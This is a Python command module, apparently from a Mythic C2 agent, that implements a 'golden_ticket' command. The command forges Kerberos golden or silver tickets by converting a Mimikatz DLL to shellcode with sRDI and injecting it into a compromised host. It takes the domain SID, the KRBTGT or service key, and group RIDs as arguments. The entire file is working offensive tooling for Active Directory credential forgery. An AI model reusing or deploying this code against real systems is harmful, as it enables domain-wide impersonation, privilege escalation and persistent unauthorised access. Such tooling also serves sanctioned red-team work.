from CommandBase import *
import json
from uuid import uuid4
from sRDI import ShellcodeRDI
from os import path
from MythicFileRPC import *


class GoldenTicketArguments(TaskArguments):

    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "domain": CommandParameter(name="domain", type=ParameterType.String, required=True, description="Must be FQDN"),
            "sid": CommandParameter(name="sid", type=ParameterType.String, required=True, description="The domain SID"),
            "user": CommandParameter(name="user", type=ParameterType.String, required=True, description="Account name"),
            "id": CommandParameter(name="id", type=ParameterType.String, required=False, description="Account RID"),
            "groups": CommandParameter(name="groups", type=ParameterType.String, required=False, description="Comma-seperated list of group RIDs - no spaces"),
            "key_type": CommandParameter(name="key_type", type=ParameterType.ChooseOne, choices=["rc4", "aes128", "aes256"], required=True),
            "key": CommandParameter(name="key", type=ParameterType.String, required=True, description="The key for the KRBTGT account (or service account for silver tickets)"),
            "target": CommandParameter(name="target", type=ParameterType.String, required=False, description="Target name (for silver tickets only - leave blank for golden tickets)"),
            "service": CommandParameter(name="service", type=ParameterType.String, required=False, description="Service name (for silver tickets only - leave blank for golden tickets)"),
            "startoffset": CommandParameter(name="startoffset", type=ParameterType.Number, required=False, description="Start time offset for the ticket"),
            "endin": CommandParameter(name="endin", type=ParameterType.Number, default_value=600, required=False, description="Expiry time for the ticket from now - default should be 10 hours"),
            "renewmax": CommandParameter(name="renewmax", type=ParameterType.Number, default_value=10080, required=False, description="Renewal time for the ticket from now - default should be 7 days"),
            "sids": CommandParameter(name="sids", type=ParameterType.String, required=False, description="Extra SIDs"),
            "sacrificial_logon": CommandParameter(name="sacrificial_logon", type=ParameterType.Boolean, default_value=True, required=True, description="Specifies whether to create a sacrificial logon to avoid overwriting the ticket of the current user")
        }

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("golden_ticket requires arguments.")
        if self.command_line[0] != "{":
            raise Exception("Require JSON blob, but got raw command line.")
        self.load_args_from_json_string(self.command_line)
        self.add_arg("pipe_name", str(uuid4()))

class GoldenTicketCommand(CommandBase):
    cmd = "golden_ticket"
    needs_admin = True
    help_cmd = "golden_ticket (modal popup)"
    description = "Forge a golden/silver ticket using Mimikatz."
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@djhohnstein"
    argument_class = GoldenTicketArguments
    browser_script = BrowserScript(script_name="unmanaged_injection", author="@djhohnstein")
    attackmapping = []

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        dllFile = path.join(self.agent_code_path, f"mimikatz_{task.callback.architecture}.dll")
        dllBytes = open(dllFile, 'rb').read()
        converted_dll = ShellcodeRDI.ConvertToShellcode(dllBytes, ShellcodeRDI.HashFunctionName("smb_server_wmain"), task.args.get_arg("pipe_name").encode(), 0)
        file_resp = await MythicFileRPC(task).register_file(converted_dll)
        if file_resp.status == MythicStatus.Success:
            task.args.add_arg("loader_stub_id", file_resp.agent_file_id)
        else:
            raise Exception("Failed to register Mimikatz DLL: " + file_resp.error_message)
        return task

    async def process_response(self, response: AgentResponse):
        pass

